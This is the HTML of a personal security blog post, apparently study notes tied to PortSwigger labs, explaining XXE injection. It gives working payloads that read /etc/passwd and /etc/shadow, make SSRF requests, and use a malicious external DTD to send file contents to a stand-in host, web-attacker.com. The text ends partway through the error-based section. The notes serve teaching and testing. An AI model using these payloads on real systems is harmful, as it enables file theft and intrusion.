@@ -1,0 +1,335 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>XML external entity // 0xSlaxo Blog</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.101.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Abdelrhman Allam" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://sl4x0.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="XML external entity"/>
+<meta name="twitter:description" content="XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application&rsquo;s processing of XML data.
+It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access. XXEs can be very impactful bugs, as they can lead to confidential information disclosure, SSRFs, and DoS attacks."/>
+
+    <meta property="og:title" content="XML external entity" />
+<meta property="og:description" content="XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application&rsquo;s processing of XML data.
+It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access. XXEs can be very impactful bugs, as they can lead to confidential information disclosure, SSRFs, and DoS attacks." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://sl4x0.github.io/web-notes/xxe-attacks/" /><meta property="article:section" content="web-notes" />
+<meta property="article:published_time" content="2021-10-23T23:48:05+00:00" />
+<meta property="article:modified_time" content="2021-10-23T23:48:05+00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://sl4x0.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="Abdelrhman Allam" /></a>
+      <h1>0xSlaxo Blog</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/about/">About</a>
+             | 
+          
+          <a class="app-header-menu-item" href="/">Home</a>
+             | 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p> M.A.C.S Student | N00b CTFer</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/sl4x0" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>My Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://www.facebook.com/sl4x0" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-facebook">
+  <title>My facebook</title>
+  <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com/sl4x0" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>My Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+          <a href="https://linkedin.com/in/sl4x0" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>My Twitter</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">XML external entity</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Oct 23, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          12 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://sl4x0.github.io/tags/xxe/">XXE</a>
+              <a class="tag" href="https://sl4x0.github.io/tags/web-notes/">Web-Notes</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application&rsquo;s processing of XML data.</p>
+<p>It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access. XXEs can be very
+impactful bugs, as they can lead to confidential information disclosure, SSRFs, and DoS attacks. But they are also difficult to understand and exploit.</p>
+<h1 id="references">References</h1>
+<p><a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity">XXE - XEE - XML External Entity</a></p>
+<p><a href="https://gowsundar.gitbook.io/book-of-bugbounty-tips/xxe">XXE</a></p>
+<p><a href="https://github.com/KathanP19/HowToHunt/tree/master/XXE">HowToHunt/XXE at master · KathanP19/HowToHunt</a></p>
+<p><a href="https://gowthams.gitbook.io/bughunter-handbook/list-of-vulnerabilities-bugs/untitled">XML Entity Injecton (XXE)</a></p>
+<p><a href="https://github.com/ngalongc/bug-bounty-reference#xxe">GitHub - ngalongc/bug-bounty-reference: Inspired by https://github.com/djadmin/awesome-bug-bounty, a list of bug bounty write-up that is categorized by the bug nature</a></p>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection">PayloadsAllTheThings/XXE Injection at master · swisskyrepo/PayloadsAllTheThings</a></p>
+<p><a href="https://github.com/vavkamil/awesome-bugbounty-tools#XXE-Injection">GitHub - vavkamil/awesome-bugbounty-tools: A curated list of various bug bounty tools</a></p>
+<p><a href="https://pentestbook.six2dez.com/enumeration/web/xxe">XXE</a></p>
+<p><a href="https://www.hacksplaining.com/login?next=%2Fexercises%2Fxml-external-entities">Hacksplaining: Web Security for Developers</a></p>
+<p><a href="https://www.hackers-arise.com/post/web-app-hacking-xxe-vulnerabilities-and-attacks">Web App Hacking: XXE Vulnerabilities and Attacks</a></p>
+<p><a href="https://techvomit.net/web-application-penetration-testing-notes/#xxe">Web Application Penetration Testing Notes</a></p>
+<p><a href="https://github.com/imran-parray/Mind-Maps/tree/master/Common%20XML%20Attacks%20-%20Harsh%20Bothra">Mind-Maps/Common XML Attacks - Harsh Bothra at master · imran-parray/Mind-Maps</a></p>
+<p><a href="https://github.com/Voorivex/pentest-guide/tree/master/XML-External-Entity">pentest-guide/XML-External-Entity at master · Voorivex/pentest-guide</a></p>
+<p><a href="https://pastebin.com/2tYWGeT7">XML External Entity [ XXE ] - Pastebin.com</a></p>
+<p><a href="https://nored0x.github.io/penetration%20testing/writeups-Bug-Bounty-hackrone/#xxe">https://nored0x.github.io/penetration%20testing/writeups-Bug-Bounty-hackrone/#xxe</a></p>
+<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html">XML Security - OWASP Cheat Sheet Series</a></p>
+<hr>
+<p><img src="https://user-images.githubusercontent.com/70459751/184545402-ce5e92f3-5a78-45c1-a7e3-df20a6ab9a57.png" alt="image"></p>
+<h1 id="mechanisms">Mechanisms</h1>
+<p>XML (Extensible Markup Language) allows developers to define and represent arbitrary data structures in a text format using a tree-like structure like that of HTML.</p>
+<p>For example, web applications commonly use XML to transport identity information in Security Assertion Markup Language (SAML) authentication. The XML might look like this</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;saml:AttributeStatement&gt;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">&lt;saml:Attribute</span> <span style="color:#a6e22e">Name=</span><span style="color:#e6db74">&#34;username&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">&lt;saml:AttributeValue&gt;</span>
+</span></span><span style="display:flex;"><span> vickieli
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">&lt;/saml:AttributeValue&gt;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">&lt;/saml:Attribute&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/saml:AttributeStatement&gt;</span>
+</span></span></code></pre></div><p>The XML format is widely used in various functionalities of web applications, including authentication, file transfers, and image uploads, or simply to transfer HTTP data from the client to the server and back.</p>
+<p>XML documents can contain a document type definition (DTD), which defines the structure of an XML document and the data it contains. These
+DTDs can be loaded from external sources or declared in the document itself within a DOCTYPE tag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE example [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> &lt;!ENTITY file &#34;Hello!&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;example&gt;</span>&amp;file;<span style="color:#f92672">&lt;/example&gt;</span>
+</span></span></code></pre></div><p>In this case, any reference of &amp;file within the XML document will be replaced by &ldquo;Hello!&rdquo;. ⇒ As it a variable!</p>
+<p>XML documents can also use external entities to access either local or remote content with a URL.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE example [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> &lt;!ENTITY file SYSTEM &#34;file:///example.txt&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;example&gt;</span>&amp;file;<span style="color:#f92672">&lt;/example&gt;</span>
+</span></span></code></pre></div><p>External entities can also load resources from the internet.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE example [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> &lt;!ENTITY file SYSTEM &#34;http://example.com/index.html&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;example&gt;</span>&amp;file;<span style="color:#f92672">&lt;/example&gt;</span>
+</span></span></code></pre></div><h1 id="how-do-xxe-vulnerabilities-arise">How do XXE vulnerabilities arise?</h1>
+<p>The issue is that if users can control the values of XML entities or external entities, they might be able to disclose internal files, port-scan internal machines, or launch DoS attacks.</p>
+<p>For example, let’s say a web application lets users upload their own XML document. The application will parse and display the document
+back to the user. A malicious user can upload a document like this one to read the <code>/etc/shadow</code> file on the server, which is where Unix systems store usernames and their encrypted passwords:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE example [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">1 &lt;!ENTITY file SYSTEM &#34;file:///etc/shadow&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;example&gt;</span>&amp;file;<span style="color:#f92672">&lt;/example&gt;</span>
+</span></span></code></pre></div><p>Applications are vulnerable to XXEs when the application accepts user-supplied XML input or passes user input into DTDs, which is then parsed
+by an XML parser, and that XML parser reads local system files or sends internal or outbound requests specified in the DTD.</p>
+<hr>
+<h1 id="hunting-for-xxes">Hunting for XXEs</h1>
+<p>To find XXEs, start with locating the functionalities that are prone to them. This includes anywhere that the application receives direct XML input, or
+receives input that is inserted into XML documents that the application parses.</p>
+<h3 id="exploiting-xxe-to-retrieve-files"><strong>Exploiting XXE to retrieve files</strong></h3>
+<p>To perform an XXE injection attack that retrieves an arbitrary file from the server&rsquo;s filesystem, you need to modify the submitted XML in two ways:</p>
+<ul>
+<li>Introduce (or edit) a <code>DOCTYPE</code> element that defines an external entity containing the path to the file.</li>
+<li>Edit a data value in the XML that is returned in the application&rsquo;s response, to make use of the defined external entity.</li>
+</ul>
+<p>For example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;stockCheck&gt;&lt;productId&gt;</span>381<span style="color:#f92672">&lt;/productId&gt;&lt;/stockCheck&gt;</span>
+</span></span></code></pre></div><p>The application performs no particular defenses against XXE attacks, so you can exploit the XXE vulnerability to retrieve the <code>/etc/passwd</code> file by submitting the following XXE payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span> ]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;stockCheck&gt;&lt;productId&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/productId&gt;&lt;/stockCheck&gt;</span>
+</span></span></code></pre></div><!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p><a href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files">Lab: Exploiting XXE using external entities to retrieve files  Web Security Academy</a></p>
+<h3 id="exploiting-xxe-to-perform-ssrf-attacks"><strong>Exploiting XXE to perform SSRF attacks</strong></h3>
+<p>To exploit an XXE vulnerability to perform an SSRF Attack ,you need to define an external XML entity using the URL that you want to target, and use the defined entity within a data value. If you can 
+use the defined entity within a data value that is returned in the application&rsquo;s response, then you will be able to view the response from  the URL within the application&rsquo;s response, and so gain two-way 
+interaction with the back-end system. If not, then you will only be able to perform blink SSRF attacks (which can still have critical consequences).</p>
+<p>In the following XXE example, the external entity will cause the server to make a back-end HTTP request to an internal system within the organization&rsquo;s infrastructure:</p>
+<p><code>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;[http://internal.vulnerable-website.com/](http://internal.vulnerable-website.com/)&quot;&gt; ]&gt;</code></p>
+<p><a href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf">Lab: Exploiting XXE to perform SSRF attacks  Web Security Academy</a></p>
+<h1 id="finding-hidden-attack-surface-for-xxe-injection">Finding hidden attack surface for XXE injection</h1>
+<p>In other cases, the attack surface is less visible. However, if you look in the right places, you will find XXE attack surface in requests that do not contain any XML.</p>
+<h3 id="xinclude-attacks"><strong>XInclude attacks</strong></h3>
+<p>An example of this occurs when client-submitted data is placed into a back-end SOAP request, which is then processed by the backend SOAP service.</p>
+<p><code>XInclude</code> is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an <code>XInclude</code>
+attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document.</p>
+<p>To perform an <code>XInclude</code> attack, you need to reference the <code>XInclude</code> namespace and provide the path to the file that you wish to include. For example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;foo</span> <span style="color:#a6e22e">xmlns:xi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XInclude&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;xi:include</span> <span style="color:#a6e22e">parse=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">href=</span><span style="color:#e6db74">&#34;file:///etc/passwd&#34;</span><span style="color:#f92672">/&gt;&lt;/foo&gt;</span>
+</span></span></code></pre></div><p><a href="https://portswigger.net/web-security/xxe/lab-xinclude-attack">Lab: Exploiting XInclude to retrieve files  Web Security Academy</a></p>
+<h3 id="xxe-attacks-via-file-upload">XXE attacks via file upload</h3>
+<p>For example, an application might allow users to upload images, and process or validate these on the server after they are uploaded. Even if the application expects to receive a format like PNG or JPEG,</p>
+<p>the image processing library that is being used might support SVG images. Since the SVG format uses XML, an attacker can submit a malicious SVG image and so reach hidden attack surface for XXE vulnerabilities.</p>
+<p><a href="https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload">Lab: Exploiting XXE via image file upload  Web Security Academy</a></p>
+<h3 id="xxe-attacks-via-modified-content-type">XXE attacks via modified content type</h3>
+<p>For example, if a normal request contains the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">action</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.0</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Content</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Type</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">application</span><span style="color:#f92672">/</span><span style="color:#a6e22e">x</span><span style="color:#f92672">-</span><span style="color:#a6e22e">www</span><span style="color:#f92672">-</span><span style="color:#a6e22e">form</span><span style="color:#f92672">-</span><span style="color:#a6e22e">urlencoded</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Content</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Length</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">foo</span><span style="color:#f92672">=</span><span style="color:#a6e22e">bar</span>
+</span></span></code></pre></div><p>Then you might be able submit the following request, with the same result:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">action</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.0</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Content</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Type</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">text</span><span style="color:#f92672">/</span><span style="color:#a6e22e">xml</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Content</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Length</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">52</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">xml</span> <span style="color:#a6e22e">version</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span> <span style="color:#a6e22e">encoding</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">&lt;foo&gt;bar&lt;/foo&gt;
+</span></span></span></code></pre></div><p>If the application tolerates requests containing XML in the message body, and parses the body content as XML, then you can reach the hidden XXE attack surface simply by reformatting requests to use the XML format.</p>
+<hr>
+<h1 id="finding-and-exploiting-blind-xxe-vulnerabilities">Finding and exploiting blind XXE vulnerabilities</h1>
+<h3 id="what-is-blind-xxe"><strong>What is blind XXE?</strong></h3>
+<p>Blind XXE vulnerabilities arise where the application is vulnerable to XXE Injection but <strong>does not return the values</strong> of any defined external entities within its responses.</p>
+<p>There are two broad ways in which you can find and exploit blind XXE vulnerabilities:</p>
+<ul>
+<li>You can trigger out-of-band network interactions, sometimes exfiltrating sensitive data within the interaction data.</li>
+<li>You can trigger XML parsing errors in such a way that the error messages contain sensitive data.</li>
+</ul>
+<h3 id="detecting-blind-xxe-using-out-of-band-oast-techniques"><strong>Detecting blind XXE using out-of-band (OAST) techniques</strong></h3>
+<p>For example, you would define an external entity as follows: <code>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;http://f2g9j7hhkax.web-attacker.com&quot;&gt; ]&gt;</code></p>
+<p>This XXE attack causes the server to make a back-end HTTP request to the specified URL. The attacker can monitor for the resulting DNS lookup and HTTP request, and thereby detect that the XXE attack was successful.</p>
+<p><a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction">Lab: Blind XXE with out-of-band interaction Web Security Academy</a></p>
+<p>Sometimes, XXE attacks using regular entities are blocked,  due to some input validation by the application or some hardening of the
+XML parser that is being used. In this situation, you might be able to  use XML parameter entities instead. XML parameter entities are a special
+kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things. First, the 
+declaration of an XML parameter entity includes the percent character  before the entity name:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % myparameterentity &#34;my parameter entity value&#34; &gt;</span>
+</span></span></code></pre></div><p>And second, parameter entities are referenced using the percent character instead of the usual ampersand:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>%myparameterentity;
+</span></span></code></pre></div><p>This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM &#34;http://f2g9j7hhkax.web-attacker.com&#34;&gt;</span> %xxe; ]&gt;
+</span></span></code></pre></div><p>This XXE payload declares an XML parameter entity called <code>xxe</code> and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker&rsquo;s domain, verifying that the attack was successful.</p>
+<p><a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities">Lab: Blind XXE with out-of-band interaction via XML parameter entities Web Security Academy</a></p>
+<h3 id="exploiting-blind-xxe-to-exfiltrate-data-out-of-band">Exploiting blind XXE to exfiltrate data out-of-band</h3>
+<p>What an attacker really wants to achieve is to exfiltrate sensitive  data. This can be achieved via a blind XXE vulnerability, but it 
+involves the attacker hosting a malicious DTD on a system that they  control, and then invoking the external DTD from within the in-band XXE  payload.</p>
+<p>An example of a malicious DTD to exfiltrate the contents of the <code>/etc/passwd</code> file is as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>!ENTITY % file SYSTEM &#34;file:///etc/passwd&#34;&gt;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http://web-attacker.com/?x=%file;&#39;&gt;</span>&#34;&gt;
+</span></span><span style="display:flex;"><span>%eval;
+</span></span><span style="display:flex;"><span>%exfiltrate;
+</span></span></code></pre></div><p>This DTD carries out the following steps:</p>
+<ul>
+<li>Defines an XML parameter entity called <code>file</code>, containing the contents of the <code>/etc/passwd</code> file.</li>
+<li>Defines an XML parameter entity called <code>eval</code>, containing a dynamic declaration of another XML parameter entity called <code>exfiltrate</code>. The <code>exfiltrate</code> entity will be evaluated by making an HTTP request to the attacker&rsquo;s web server containing the value of the <code>file</code> entity within the URL query string.</li>
+<li>Uses the <code>eval</code> entity, which causes the dynamic declaration of the <code>exfiltrate</code> entity to be performed.</li>
+<li>Uses the <code>exfiltrate</code> entity, so that its value is evaluated by requesting the specified URL.</li>
+</ul>
+<p>For example, the attacker might serve the malicious DTD at the following URL: <code>http://web-attacker.com/malicious.dtd</code></p>
+<p>Finally, the attacker must submit the following XXE payload to the vulnerable application:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&#34;http://web-attacker.com/malicious.dtd&#34;&gt;</span> %xxe;]&gt;
+</span></span></code></pre></div><p>This XXE payload declares an XML parameter entity called <code>xxe</code> and then uses the entity within the DTD. This will cause the XML parser
+to fetch the external DTD from the attacker&rsquo;s server and interpret it  inline. The steps defined within the malicious DTD are then executed, 
+and the <code>/etc/passwd</code> file is transmitted to the attacker&rsquo;s server.</p>
+<p><a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration">Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD Web Security Academy</a></p>
+<h3 id="exploiting-blind-xxe-to-retrieve-data-via-error-messages">Exploiting blind XXE to retrieve data via error messages</h3>
+<p>You can trigger an XML parsing error message containing the contents of the <code>/etc/passwd</code> file using a malicious external DTD as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % file SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; error SYSTEM &#39;file:///nonexistent/%file;&#39;&gt;</span>&#34;&gt;
+</span></span><span style="display:flex;"><span>%eval;
+</span></span><span style="display:flex;"><span>%error;
+</span></span></code></pre></div><p>This DTD carries out the following steps:</p>
+<ul>
+<li>Defines an XML parameter entity called <code>file</code>, containing the contents of the <code>/etc/passwd</code> file.</li>
+<li>Defines an XML parameter entity called <code>eval</code>, containing a dynamic declaration of another XML parameter entity called <code>error</code>. The <code>error</code> entity will be evaluated by loading a nonexistent file whose name contains the value of the <code>file</code> entity.</li>
